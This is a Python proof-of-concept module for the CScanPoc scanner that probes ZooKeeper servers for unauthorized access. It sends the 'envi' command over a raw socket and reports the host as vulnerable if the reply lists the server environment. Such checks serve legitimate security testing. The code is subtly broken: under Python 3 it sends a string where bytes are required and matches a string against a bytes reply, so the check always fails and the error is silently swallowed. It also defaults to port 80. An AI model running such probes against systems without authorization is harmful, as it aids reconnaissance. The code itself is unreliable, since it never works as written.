# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
import socket
import urllib.parse


class Vuln(ABVuln):
    vuln_id = 'Zookeeper_0000'  # 平台漏洞编号
    name = 'Zookeeper未授权访问'  # 漏洞名称
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.OTHER  # 漏洞类型
    disclosure_date = '2016-08-09'  # 漏洞公布时间
    desc = '''
        Zookeeper是分布式应用程序的协调服务。它允许通过简单的界面管理命名，同步，配置管理和组服务等常用服务，并在操作系统上使用文件系统的数据模型。
        Zookeeper Unauthorized access.
    '''  # 漏洞描述
    ref = 'https://hackerone.com/reports/154369'
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Zookeeper'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'fbde7696-920c-4be5-9b04-6e108dab8a3b'  # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-06-01'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            timeout = 5
            arg = '{target}'.format(target=self.target)
            url = urllib.parse.urlparse(arg)
            ip = socket.gethostbyname(url.hostname)
            port = url.port if url.port else 80
            socket.setdefaulttimeout(timeout)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, int(port)))
            flag = "envi"
            s.send(flag)
            data = s.recv(1024)
            s.close()
            if 'Environment' in data:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
